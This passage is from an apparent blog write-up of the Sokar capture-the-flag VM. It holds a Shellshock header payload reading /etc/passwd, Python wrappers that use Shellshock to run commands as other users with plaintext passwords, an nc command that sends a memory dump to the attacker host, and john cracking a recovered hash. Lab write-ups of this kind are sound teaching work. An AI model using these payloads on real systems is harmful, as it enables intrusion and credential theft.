# vuln@ curl -i -X OPTIONS -H "User-Agent: () { :;};echo;/bin/cat /etc/passwd" "http://192.168.217.163:591/cgi-bin/cat"
source = sys.argv[1].strip()
destination = sys.argv[2].strip()
print " * Starting transfer of local '%s' to remote '%s'" % (source, destination)

hex_destination_file = "/tmp/" + binascii.b2a_hex(os.urandom(15)) + ".txt"
print " * Temp file on remote will be: %s" % hex_destination_file

# prepare a hex version of the local file
with open(source) as f:
    source_file = f.read()

# encode and split the source into chunks of 60
source_file = source_file.encode('hex')
source_data = {}
source_data = [source_file[i:i+60] for i in range(0, len(source_file), 60)]

print " * Transferring %d chunks to %s" % (len(source_data), hex_destination_file)
iteration = 1
for chunk in source_data:

    # check if it is start of file or append
    if iteration == 1:
        append = "&gt;"
    else:
        append = "&gt;&gt;"

    # prepare the command and run it
    command = "echo '%s' %s %s" % (chunk, append, hex_destination_file)
    do_command(command)

    print " * Chunk %d/%d transferred" % (iteration, len(source_data))
    iteration += 1

print " * Decoding hex on remote"
command = "/usr/bin/xxd -r -p %s &gt; %s" % (hex_destination_file, destination)
do_command(command)

print " * Cleaning up temp file %s" % hex_destination_file
command = "/bin/rm -f %s" %  hex_destination_file
do_command(command)

print " * Local '%s' transferred to remote '%s'" % (source, destination)
</code></pre>

<p>```</p>

<h2>egress firewalls le-suck</h2>

<p>With the file transfer script done, I coded up a small &lsquo;port scanner&rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Sokar Egress Port Scanner</h1>

<h1>2015 Leon Jacobs</h1>

<p>import socket</p>

<p>for port in xrange(1, 65535):</p>

<pre><code>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.1)
print "Trying port %d" % port
sock.connect_ex(("192.168.217.174", port))
sock.close()
</code></pre>

<p>```</p>

<p>&hellip; and transferred it to Sokar using my <code>transfer.py</code> script:</p>

<p><code>bash
leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
 * Starting transfer of local 'port_scan.py' to remote '/tmp/port_scan.py'
 * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Transferring 10 chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Chunk 1/10 transferred
 * Chunk 2/10 transferred
 * Chunk 3/10 transferred
 * Chunk 4/10 transferred
 * Chunk 5/10 transferred
 * Chunk 6/10 transferred
 * Chunk 7/10 transferred
 * Chunk 8/10 transferred
 * Chunk 9/10 transferred
 * Chunk 10/10 transferred
 * Decoding hex on remote
 * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Local 'port_scan.py' transferred to remote '/tmp/port_scan.py'
</code></p>

<p>I also opened up a <code>tcpdump</code> on my local Kali Linux VM, filtering out <code>tcp/591</code> as well as <code>arp</code> traffic:</p>

<p>```bash
leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes</p>

<p>```</p>

<p>Finally, I fired the scanner off using the previously developed <code>shock.py</code> script:</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/usr/bin/python /tmp/port_scan.py&rdquo;
 * Executing /usr/bin/python /tmp/port_scan.py</p>

<p>```</p>

<p>I waited&hellip; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the <code>tcpdump</code> had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.</p>

<h2>bynarr the fruit</h2>

<p>Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that <code>/home/bynarr</code> was readable to me. In there was what looked like a kernel module <code>lime.ko</code> and a script called <code>lime</code> to <code>insmod</code> it. Both were owned by root:</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/bin/cat /home/bynarr/lime&rdquo;
 * Executing /bin/cat /home/bynarr/lime</p>

<h1>!/bin/bash</h1>

<h1>echo &ldquo;&rdquo;"</h1>

<h1>Linux Memory Extractorator</h1>

<p>&ldquo;
echo "LKM, add or remove?&rdquo;
echo -en &ldquo;> &rdquo;</p>

<p>read -e input</p>

<p>if [ $input == &ldquo;add&rdquo; ]; then</p>

<pre><code>/sbin/insmod /home/bynarr/lime.ko "path=/tmp/ram format=raw"
</code></pre>

<p>elif [ $input == &ldquo;remove&rdquo; ]; then</p>

<pre><code>/sbin/rmmod lime
</code></pre>

<p>else</p>

<pre><code>echo "Invalid input, burn in the fires of Netu!"
</code></pre>

<p>fi</p>

<p>```</p>

<p>I knew that the chances were slim that it would allow me to run <code>insmod</code> as <code>apache</code>, but ofc I tried running the script regardless. Due to the fact that the file called <code>/tmp/ram</code> was not created after running <code>python shock.py "echo \"add\" | /home/bynarr/lime"</code>, I assumed it failed.</p>

<p>Later, some more enumeration finally got me to <code>/var/spool/mail/bynarr</code> with a message with the following contents:</p>

<p>```text
leonjza@kali/sokar $ python shock.py &ldquo;/bin/cat /var/spool/mail/bynarr&rdquo;
 * Executing /bin/cat /var/spool/mail/bynarr</p>

<p>Return-Path: &lt;root@sokar>
Delivered-To: bynarr@localhost
Received:  from root by localhost
To: &lt;bynarr@sokar>
Date: Thu, 13 Nov 2014 22:04:31 +0100
Subject: Welcome</p>

<p>Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
A user account has been setup for you.</p>

<p>UID 500 (bynarr)
GID 500 (bynarr)</p>

<pre><code>501 (forensic)
</code></pre>

<p>Password &lsquo;fruity&rsquo;.  Please change this ASAP.
Should you require, you&rsquo;ve been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis.</p>

<p>All the best in your new role!</p>

<p>  -Sokar-
```</p>

<p>I confirmed that <code>bynarr</code> was in the groups mentioned in the mail:</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/usr/bin/id bynarr&rdquo;
 * Executing /usr/bin/id bynarr</p>

<p>uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```</p>

<p>What confused me here was the mention of <em>&ldquo;outbound ephemeral port access on 51242&rdquo;</em>. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new <code>tcpdump</code> session and waited anxiously. <code>tcp/51242</code> outbound still appeared to be closed.</p>

<p>Of course, the most valuable piece of information was definitely the password <em>fruity</em>. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.</p>

<p>Essentially, the easiest way for me to become <code>bynarr</code> (assuming <em>fruity</em> really is the password), would be to <code>su</code> right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where <code>su</code> expects a password via <code>stdin</code>, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can&rsquo;t). Quite some time later, I got closer to becoming <code>bynarr</code> with something like <code>echo fruity | su bynarr</code>. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though <code>$(which id)</code> came in very handy and saved some time. In retrospect, I could have probably just exported <code>PATH</code> as required, but heh.</p>

<p>Fast forward some time, I came across <a href="http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells">this</a> SANS blogpost, which details on the topic of some &lsquo;stealthy&rsquo; su shells. Most importantly, the example of <code>(sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"</code> got me the closest to <code>bynarr</code>. Toying around with this a little, I realized that for some reason, the <code>(</code> and <code>)</code> characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:</p>

<p><code>/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"</code></p>

<p>(Basically, spawn a tty; attempt to <code>su</code> specifying the command to run with <code>-c</code>, then 1 second later, echo <code>fruity</code> to the <em>Password</em> prompt and execute <code>id</code> as <code>bynarr</code>)</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/usr/bin/python -c \"import time; time.sleep(1); print &lsquo;fruity&rsquo;\&rdquo; | /usr/bin/python -c \&ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;id&rsquo;, &lsquo;bynarr&rsquo;]);\&rdquo;&ldquo;
 * Executing /usr/bin/python -c "import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;id&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo;</p>

<p>Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```</p>

<p>:D As this is actually a Shellshock request, the full <code>User-Agent</code> header therefore was:</p>

<p><code>text
() { :;};echo;/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"
</code></p>

<p>Again, constructing that every time I want to execute something as <code>bynarr</code> would have been le-suck, so I made another wrapper script:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Sokar &lsquo;bynarr&rsquo; command execution</h1>

<h1>2015 Leon Jacobs</h1>

<p>import requests
import sys</p>

<p>if len(sys.argv) &lt; 2:</p>

<pre><code>print " * Usage %s &lt;cmd&gt;" % sys.argv[0]
sys.exit(1)
</code></pre>

<p>command = sys.argv[1].strip()
payload = &ldquo;&rdquo;&ldquo;/usr/bin/python -c "import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;%s&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo; &ldquo;&rdquo;&ldquo; % command
print &rdquo; * Executing %s\n" % payload</p>

<h1>prepare the sploit header</h1>

<p>headers = { &ldquo;User-Agent&rdquo;: &ldquo;() { :;};echo;%s&rdquo; % payload }
print requests.get(&ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;, headers=headers).text.strip()
```</p>

<p>All I have to do to get the output of <code>id</code> is provide it as a argument to <code>bynarr.py</code>:</p>

<p>```bash
leonjza@kali/sokar $ python bynarr.py &ldquo;id&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;id&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo;</p>

<p>Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```</p>

<h2>the scary linux memory extractor</h2>

<p>With command access as <code>bynarr</code> and remembering the mention of <code>tcp/51242</code> outbound connectivity, I once more try and run the port scanner that got copied to <code>/tmp</code>:</p>

<p>```bash
leonjza@kali/sokar $ python bynarr.py &ldquo;/usr/bin/python /tmp/port_scan.py&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;/usr/bin/python /tmp/port_scan.py&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo;</p>

<p>Password:
Trying port 51240
Trying port 51241
Trying port 51242
Trying port 51243
Trying port 51244
Trying port 51245
Trying port 51246
Trying port 51247
Trying port 51248
Trying port 51249
```</p>

<p>Checking the <code>tcpdump</code> output of this run&hellip;:</p>

<p><code>text
leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
07:33:43.178113 IP 192.168.217.163.40371 &gt; 192.168.217.174.51242: Flags [S], seq 594732851, win 14600, options [mss 1460,sackOK,TS val 2274844 ecr 0,nop,wscale 4], length 0
07:33:43.178129 IP 192.168.217.174.51242 &gt; 192.168.217.163.40371: Flags [R.], seq 0, ack 594732852, win 0, length 0
</code></p>

<p>&hellip; I finally see something coming out of Sokar!
So <code>bynarr</code> is able to talk out on <code>tcp/51242</code>. Wut. Taking a few moments to think about this, I remembered that <code>iptables</code> is able to filter by user id using the <code>owner</code> module. At this stage, this was the only thing that made sense why <code>apache</code> would not be able to talk out on this port, but <code>bynarr</code> can.</p>

<p>So with that out the way, it was time to focus on this <code>lime</code> thing. <code>bynarr</code> was allowed to run <code>/home/bynarr/lime</code> as root via <code>sudo</code> without a password (as I suspected for the <code>insmod</code>):</p>

<p>```bash
leonjza@kali/sokar $ python bynarr.py &ldquo;sudo -l&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;sudo -l&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo;</p>

<p>Password:
Matching Defaults entries for bynarr on this host:</p>

<pre><code>!requiretty, visiblepw, always_set_home, env_reset, env_keep="COLORS
DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
</code></pre>

<p>User bynarr may run the following commands on this host:</p>

<pre><code>(ALL) NOPASSWD: /home/bynarr/lime
</code></pre>

<p>```</p>

<p>I had no freaking idea what <code>lime</code> even really is, so, to the Gooooogles I went and came across this: <a href="https://github.com/504ensicsLabs/LiME">https://github.com/504ensicsLabs/LiME</a>. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p</p>

<p>I ran the script to <code>insmod</code> the <code>lime.ko</code>, this time with <code>sudo</code>:</p>

<p>```bash
leonjza@kali/sokar $ python bynarr.py &ldquo;echo \"add\&rdquo; | sudo /home/bynarr/lime"
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;echo "add&rdquo; | sudo /home/bynarr/lime&rsquo;, &lsquo;bynarr&rsquo;]);"</p>

<p>Password:</p>

<p>==========================</p>

<h1>Linux Memory Extractorator</h1>

<p>LKM, add or remove?</p>

<blockquote></blockquote>

<p>```</p>

<p>I checked <code>/tmp</code> for the existence of the <code>ram</code> file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.</p>

<p>Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local <code>ram</code> file with <code>nc -lvp 51242 &gt; ram</code>. Then, using my wrapper script <code>bynarr.py</code> again, I redirected the <code>/tmp/ram</code> file out over the netcat connection with: <code>python bynarr.py "/usr/bin/nc 192.168.217.174 51242 &lt; /tmp/ram"</code>. I now had a memory dump of Sokar on my local Kali Linux.</p>

<p>It was at this stage that I went down the wrong rabbit hole. <a href="https://code.google.com/p/volatility/">Volatility</a> was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM&rsquo;s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty &lsquo;ol <code>strings</code>.</p>

<p>I had to think a bit about what could possibly be useful in memory for me now. I noticed the user <code>apophis</code> had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:</p>

<p>```bash
leonjza@kali/sokar $ strings ram | grep apophis</p>

<p>[&hellip; snip &hellip;]</p>

<p>apophis:[snip]0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
```</p>

<p>&hellip; <strong>wut</strong>. Why&hellip; wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet&hellip; but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through <code>john</code>:</p>

<p><code>bash
leonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Loaded 1 password hash (sha512crypt [32/32])
overdrive        (apophis)
guesses: 1  time: 0:00:01:51 DONE (Sat Jan 31 20:35:42 2015)  c/s: 327  trying: parati - nicole28
Use the "--show" option to display all of the cracked passwords reliably
</code></p>

<p><code>apophis:overdrive</code>.</p>

<h2>build the clone to the hook</h2>

<p>To get command execution as <code>apophis.py</code> I copied the <code>bynarr.py</code> script to make <code>apophis.py</code>, changing the username and the password.</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;id&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;id&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
uid=501(apophis) gid=502(apophis) groups=502(apophis)
```</p>

<p>There we go! Command execution as <code>apophis</code> :) In <code>/home/apophis</code> there was a suid (for <code>root</code>) binary called <code>build</code>:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;ls -lah /home/apophis&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;ls -lah /home/apophis&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
total 36K
drwx&mdash;&mdash;&mdash;  2 apophis apophis 4.0K Jan  2 20:12 .
drwxr-xr-x. 4 root    root    4.0K Dec 30 19:20 ..
-rw&mdash;&mdash;&mdash;&ndash;  1 apophis apophis    9 Feb  2 20:55 .bash_history
-rw-r&mdash;r&mdash;  1 apophis apophis   18 Feb 21  2013 .bash_logout
-rw-r&mdash;r&mdash;  1 apophis apophis  176 Feb 21  2013 .bash_profile
-rw-r&mdash;r&mdash;  1 apophis apophis  124 Feb 21  2013 .bashrc
-rwsr-sr-x  1 root    root    8.3K Jan  2 17:49 build
```</p>

<p>I thought I would copy this <code>build</code> binary off the box as I don’t exactly have a nice interactive shell to work with yet. <code>apophis</code> was also not able to to connect via <code>tcp/51242</code> outbound, which further confirmed my suspicions on the <code>user</code> module being used in iptables. I copied the binary to <code>/tmp/build</code> and pushed it out via netcat as <code>bynarr</code> (using my helper script) towards my local Kali linux install. Finally I had <code>build</code> locally to play with.</p>

<p>I later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further.
Running it asked you if you wanted to &lsquo;build?&rsquo;:</p>

<p><code>bash
leonjza@kali/sokar $ ./build
Build? (Y/N) Y
Cloning into '/mnt/secret-project'...
ssh: Could not resolve hostname sokar-dev:: Name or service not known
fatal: The remote end hung up unexpectedly
</code></p>

<p>That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for <code>apophis</code>:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;echo Y | /home/apophis/build&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;echo Y | /home/apophis/build&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
Cloning into &lsquo;/mnt/secret-project&rsquo;&hellip;
ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution
fatal: Could not read from remote repository.</p>

<p>Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
```</p>

<p>The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to <code>/mnt/secret-project</code> from <code>sokar-dev</code> which does not resolve.</p>

<h3>the impossible b0f</h3>

<p>I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to <code>build.</code>:</p>

<p><code>bash
leonjza@kali/sokar $ ./build
Build? (Y/N) YY
*** buffer overflow detected ***: ./build terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x2b53e6df5fe7]
/lib/x86_64-linux-gnu/libc.so.6(+0xefea0)[0x2b53e6df4ea0]
/lib/x86_64-linux-gnu/libc.so.6(__gets_chk+0x195)[0x2b53e6df4df5]
./build(main+0xea)[0x2b53e68e29d9]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x2b53e6d23ead]
./build(+0x7d9)[0x2b53e68e27d9]
======= Memory map: ========
2b53e68e2000-2b53e68e3000 r-xp 00000000 fe:00 667555                     /root/sokar/build
2b53e68e3000-2b53e68e7000 rwxp 00000000 00:00 0
2b53e6900000-2b53e6902000 rwxp 00000000 00:00 0
2b53e6ae2000-2b53e6ae3000 rwxp 00000000 fe:00 667555                     /root/sokar/build
2b53e6ae3000-2b53e6b03000 r-xp 00000000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d03000-2b53e6d04000 rwxp 00020000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d04000-2b53e6d05000 rwxp 00000000 00:00 0
2b53e6d05000-2b53e6e87000 r-xp 00000000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e6e87000-2b53e7087000 ---p 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e7087000-2b53e708b000 r-xp 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708b000-2b53e708c000 rwxp 00186000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708c000-2b53e7091000 rwxp 00000000 00:00 0
2b53e7091000-2b53e70a6000 r-xp 00000000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e70a6000-2b53e72a6000 ---p 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e72a6000-2b53e72a7000 rwxp 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e886b000-2b53e888c000 rwxp 00000000 00:00 0                          [heap]
7fff340b7000-7fff340d8000 rwxp 00000000 00:00 0                          [stack]
7fff341eb000-7fff341ed000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[1]    18571 abort      ./build
</code></p>

<p>I slapped <code>build</code> into <code>gdb</code> to take a closer look at the potential overflow as well as the security features that <code>build</code> has been compiled with:</p>

<p><code>bash
leonjza@kali/sokar $ gdb -q ./build
Reading symbols from /root/sokar/build...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : disabled
PIE       : ENABLED
RELRO     : disabled
</code></p>

<p>:O The <code>CANARY</code> explains the failure in <code>__fortify_fail</code>. Disassembly of the <code>main</code> function reveals a call to <code>__gets_chk</code> which is responsible for the canary validation:</p>

<p>```bash
gdb-peda$ disass main
Dump of assembler code for function main:</p>

<p> [&hellip; snip &hellip;]</p>

<p>   0x00000000000009cc &lt;+221>:   mov    esi,0x2
   0x00000000000009d1 &lt;+226>:   mov    rdi,rbx
   0x00000000000009d4 &lt;+229>:   call   0x760 &lt;__gets_chk@plt>
   0x00000000000009d9 &lt;+234>:   lea    rsi,[rbp-0x30]
   0x00000000000009dd &lt;+238>:   mov    rdi,rbx
   0x00000000000009e0 &lt;+241>:   call   0x790 &lt;strcmp@plt>
   0x00000000000009e5 &lt;+246>:   test   eax,eax</p>

<p> [&hellip; snip &hellip;]
```</p>

<p>It is possible that the original source was using <code>gets()</code> without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.</p>

<p>I fiddled around a little more with the binary, and inspected the call to <code>encryptDecrypt</code>:</p>

<p><code>bash
gdb-peda$ disass encryptDecrypt
Dump of assembler code for function encryptDecrypt:
   0x00000000000008ac &lt;+0&gt;: mov    rdx,rdi
   0x00000000000008af &lt;+3&gt;: mov    r9d,0x0
   0x00000000000008b5 &lt;+9&gt;: mov    r11,0xffffffffffffffff
   0x00000000000008bc &lt;+16&gt;:    mov    r10,rdi
   0x00000000000008bf &lt;+19&gt;:    mov    eax,0x0
   0x00000000000008c4 &lt;+24&gt;:    jmp    0x8d6 &lt;encryptDecrypt+42&gt;
   0x00000000000008c6 &lt;+26&gt;:    movzx  ecx,BYTE PTR [rdx+r8*1]
   0x00000000000008cb &lt;+31&gt;:    xor    ecx,0x49
   0x00000000000008ce &lt;+34&gt;:    mov    BYTE PTR [rsi+r8*1],cl
   0x00000000000008d2 &lt;+38&gt;:    add    r9d,0x1
   0x00000000000008d6 &lt;+42&gt;:    movsxd r8,r9d
   0x00000000000008d9 &lt;+45&gt;:    mov    rcx,r11
   0x00000000000008dc &lt;+48&gt;:    mov    rdi,r10
   0x00000000000008df &lt;+51&gt;:    repnz scas al,BYTE PTR es:[rdi]
   0x00000000000008e1 &lt;+53&gt;:    not    rcx
   0x00000000000008e4 &lt;+56&gt;:    sub    rcx,0x1
   0x00000000000008e8 &lt;+60&gt;:    cmp    r8,rcx
   0x00000000000008eb &lt;+63&gt;:    jb     0x8c6 &lt;encryptDecrypt+26&gt;
   0x00000000000008ed &lt;+65&gt;:    repz ret
End of assembler dump.
</code></p>

<p>This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with <strong>I</strong> as the key over a string.</p>

<p>```c
void encryptDecrypt(int arg0, int arg1) {</p>

<pre><code>rsi = arg1;
rdx = arg0;
LODWORD(r9) = 0x0;
r10 = arg0;
do {
        r8 = sign_extend_64(LODWORD(r9));
        asm{ repne scasb  };
        if (r8 &gt;= !0xffffffffffffffff - 0x1) {
            break;
        }
        *(int8_t *)(rsi + r8) = LOBYTE(LODWORD(*(int8_t *)(rdx + r8) &amp; 0xff) ^ 0x49);
        LODWORD(r9) = LODWORD(r9) + 0x1;
} while (true);
return;
</code></pre>

<p>}
```</p>

<p>Running the binary in <code>gdb</code> and setting a breakpoint before the <code>system()</code> call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted <strong>and</strong> decrypted versions of the string to be executed.</p>

<p>```bash
sokar # gdb -q ./build
gdb-peda$ r
Build? (Y/N) n
OK :(
[Inferior 1 (process 4450) exited with code 06]
Warning: not running or target is remote
gdb-peda$ b <em>0x0000555555554a38
Breakpoint 1 at 0x555555554a38
gdb-peda$ r
Build? (Y/N) Y
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
RAX: 0x0
RBX: 0x7fffffffe740 (&ldquo;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&rdquo;)
RCX: 0x7ffff7b26e99 (&lt;setreuid+25>: cmp    rax,0xfffffffffffff000)
RDX: 0x7fffffffe7a0 (&ldquo;f&lt;:;f+ &lsquo;f. =i</em>%&amp;&rsquo;,i::!sff;&amp;&amp;=\t:&amp;\&rdquo;(;d-,?sf;&amp;&amp;=f:,<em>;,=d9;&amp;#,</em>=if$&lsquo;=f:,<em>;,=d9;&amp;#,</em>=f")
RSI: 0x0
RDI: 0x7fffffffe740 (&ldquo;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&rdquo;)
RBP: 0x7fffffffe830 &mdash;> 0x0
RSP: 0x7fffffffe740 (&ldquo;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&rdquo;)
RIP: 0x555555554a38 (&lt;main+329>:    mov    eax,0x0)
R8 : 0x51 ('Q&rsquo;)
R9 : 0x51 (&lsquo;Q&rsquo;)
R10: 0x0
R11: 0x246
